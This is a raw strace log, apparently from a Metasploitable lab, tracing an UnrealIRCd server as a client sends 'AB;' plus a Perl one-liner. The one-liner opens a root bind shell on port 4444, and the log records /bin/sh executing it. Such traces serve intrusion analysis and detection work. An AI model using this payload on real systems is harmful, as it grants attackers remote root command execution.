4519  07:22:16.439757 select(1024, [2 3 4 7 9], [], NULL, {0, 440000}) = 1 (in [2], left {0, 250000})
4519  07:22:16.629172 clock_gettime(CLOCK_MONOTONIC, {1746, 446193804}) = 0
4519  07:22:16.629193 time(NULL)        = 1495624936
4519  07:22:16.629203 time(NULL)        = 1495624936
4519  07:22:16.629218 gettimeofday({1495624936, 629223}, NULL) = 0
4519  07:22:16.629231 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:22:16.629269 clock_gettime(CLOCK_MONOTONIC, {1746, 446282292}) = 0
4519  07:22:16.629279 gettimeofday({1495624936, 629283}, NULL) = 0
4519  07:22:16.629289 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:22:16.629327 clock_gettime(CLOCK_MONOTONIC, {1746, 446339606}) = 0
4519  07:22:16.629338 accept(2, 0, NULL) = 5
4519  07:22:16.629356 getpeername(5, {sa_family=AF_INET, sin_port=htons(38129), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:22:16.629386 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:22:16.629398 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:22:16.629411 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:22:16.629423 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:22:16.629434 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:22:16.629445 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:22:16.629459 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:22:16.629494 clock_gettime(CLOCK_MONOTONIC, {1746, 446507550}) = 0
4519  07:22:16.629506 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:22:16.629664 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:22:16.629687 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:22:16.629696 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:22:16.629707 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:22:16.629723 send(6, "\351\370\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:22:16.629837 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:22:16.629874 gettimeofday({1495624936, 629878}, NULL) = 0
4519  07:22:16.629886 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:22:16.634661 clock_gettime(CLOCK_MONOTONIC, {1746, 451678767}) = 0
4519  07:22:16.634678 recvfrom(6, "\351\370\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\37\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:22:16.634719 close(6)          = 0
4519  07:22:16.634734 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:22:16.634748 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:22:16.634805 time(NULL)        = 1495624936
4519  07:22:16.634817 time(NULL)        = 1495624936
4519  07:22:16.634829 gettimeofday({1495624936, 634833}, NULL) = 0
4519  07:22:16.634841 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:22:16.634870 clock_gettime(CLOCK_MONOTONIC, {1746, 451882486}) = 0
4519  07:22:16.634880 gettimeofday({1495624936, 634884}, NULL) = 0
4519  07:22:16.634890 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 220000})
4519  07:22:17.408242 clock_gettime(CLOCK_MONOTONIC, {1747, 225277661}) = 0
4519  07:22:17.408302 recv(7, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:22:17.408345 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408377 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408398 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408413 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408426 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408448 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408462 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408475 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408488 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408502 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408515 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408528 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408541 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408554 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408567 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408580 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408593 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408606 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408664 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408696 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408723 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408736 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 290000}, ...}) = 0
4519  07:22:17.408752 gettimeofday({1495624937, 408756}, NULL) = 0
4519  07:22:17.408764 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:22:17.408804 clock_gettime(CLOCK_MONOTONIC, {1747, 225817383}) = 0
4519  07:22:17.408816 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:22:17.408843 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:22:17.408862 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:22:17.408874 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:22:17.408889 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 8189
8189  07:22:17.408971 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
8189  07:22:17.408985 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
8189  07:22:17.408995 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8189  07:22:17.409008 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
8189  07:22:17.409130 brk(0)            = 0x80f9000
8189  07:22:17.409132 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8189  07:22:17.409132 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa4000
8189  07:22:17.409132 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
8189  07:22:17.409133 open("/etc/ld.so.cache", O_RDONLY) = 1
8189  07:22:17.409133 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8189  07:22:17.409133 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f9c000
8189  07:22:17.409133 close(1)          = 0
8189  07:22:17.409134 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8189  07:22:17.409134 open("/lib/libncurses.so.5", O_RDONLY) = 1
8189  07:22:17.409134 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
8189  07:22:17.409227 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
8189  07:22:17.409245 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f6c000
8189  07:22:17.409257 mmap2(0xb7f99000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f99000
8189  07:22:17.409319 close(1)          = 0
8189  07:22:17.409346 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8189  07:22:17.409375 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
8189  07:22:17.409389 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
8189  07:22:17.409491 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
8189  07:22:17.409508 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f68000
8189  07:22:17.409519 mmap2(0xb7f6a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f6a000
8189  07:22:17.409534 close(1)          = 0
8189  07:22:17.409545 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8189  07:22:17.409558 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
8189  07:22:17.409572 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
8189  07:22:17.409661 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
8189  07:22:17.409677 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f67000
8189  07:22:17.409691 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e18000
8189  07:22:17.409702 mmap2(0xb7f61000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f61000
8189  07:22:17.409716 mmap2(0xb7f64000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f64000
8189  07:22:17.409729 close(1)          = 0
8189  07:22:17.409751 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e17000
8189  07:22:17.409781 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e176b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
8189  07:22:17.409893 mprotect(0xb7f61000, 4096, PROT_READ) = 0
8189  07:22:17.409929 munmap(0xb7f9c000, 29913) = 0
8189  07:22:17.409954 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8189  07:22:17.409968 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
8189  07:22:17.409988 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe41000) = -1 ENOTTY (Inappropriate ioctl for device)
8189  07:22:17.410017 brk(0)            = 0x80f9000
8189  07:22:17.410027 brk(0x80fa000)    = 0x80fa000
8189  07:22:17.410038 brk(0x80fb000)    = 0x80fb000
8189  07:22:17.410054 getuid32()        = 0
8189  07:22:17.410063 getgid32()        = 0
8189  07:22:17.410072 geteuid32()       = 0
8189  07:22:17.410081 getegid32()       = 0
8189  07:22:17.410093 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8189  07:22:17.410107 time(NULL)        = 1495624937
8189  07:22:17.410119 brk(0x80fc000)    = 0x80fc000
8189  07:22:17.410133 brk(0x80fd000)    = 0x80fd000
8189  07:22:17.410153 open("/proc/meminfo", O_RDONLY) = 1
8189  07:22:17.410175 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
8189  07:22:17.410192 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa3000
8189  07:22:17.410204 read(1, "MemTotal:      1035240 kB\nMemFree:        524628 kB\nBuffers:         65280 kB\nCached:         287940 kB\nSwapCached:          0 kB\nActive:         254792 kB\nInactive:       227392 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        524388 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4388 kB\nWriteback:           0 kB\nAnonPages:      128980 kB\nMapped:          52004 kB\nSlab:            17160 kB\nSReclaimable:     8892 kB\nSUnreclaim:       8268 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
8189  07:22:17.410346 close(1)          = 0
8189  07:22:17.410373 munmap(0xb7fa3000, 4096) = 0
8189  07:22:17.410415 brk(0x80fe000)    = 0x80fe000
8189  07:22:17.410441 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
8189  07:22:17.410455 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
8189  07:22:17.410466 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8189  07:22:17.410478 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8189  07:22:17.410489 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
8189  07:22:17.410501 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
8189  07:22:17.410514 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8189  07:22:17.410525 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8189  07:22:17.410538 uname({sys="Linux", node="metasploitable", ...}) = 0
8189  07:22:17.410588 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8189  07:22:17.410606 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8189  07:22:17.410624 brk(0x8100000)    = 0x8100000
8189  07:22:17.410635 getcwd("/etc/unreal", 4096) = 12
8189  07:22:17.410649 getpid()          = 8189
8189  07:22:17.410665 getppid()         = 4519
8189  07:22:17.410680 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8189  07:22:17.410700 stat64("/sbin/sh", 0xbfe40fd8) = -1 ENOENT (No such file or directory)
8189  07:22:17.410712 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
8189  07:22:17.410729 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
8189  07:22:17.410752 socket(PF_FILE, SOCK_STREAM, 0) = 1
8189  07:22:17.410784 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
8189  07:22:17.410823 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
8189  07:22:17.410879 close(1)          = 0
8189  07:22:17.410890 socket(PF_FILE, SOCK_STREAM, 0) = 1
8189  07:22:17.410900 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
8189  07:22:17.410910 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
8189  07:22:17.410927 close(1)          = 0
8189  07:22:17.410941 open("/etc/nsswitch.conf", O_RDONLY) = 1
8189  07:22:17.410955 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
8189  07:22:17.410971 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa3000
8189  07:22:17.410981 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
8189  07:22:17.411029 read(1, "", 4096) = 0
8189  07:22:17.411039 close(1)          = 0
8189  07:22:17.411048 munmap(0xb7fa3000, 4096) = 0
8189  07:22:17.411065 open("/etc/ld.so.cache", O_RDONLY) = 1
8189  07:22:17.411077 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8189  07:22:17.411093 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f9c000
8189  07:22:17.411103 close(1)          = 0
8189  07:22:17.411113 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8189  07:22:17.411127 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
8189  07:22:17.411141 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
8189  07:22:17.411228 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
8189  07:22:17.411244 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e0e000
8189  07:22:17.411256 mmap2(0xb7e15000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e15000
8189  07:22:17.411322 close(1)          = 0
8189  07:22:17.411351 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8189  07:22:17.411381 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
8189  07:22:17.411395 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
8189  07:22:17.411494 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
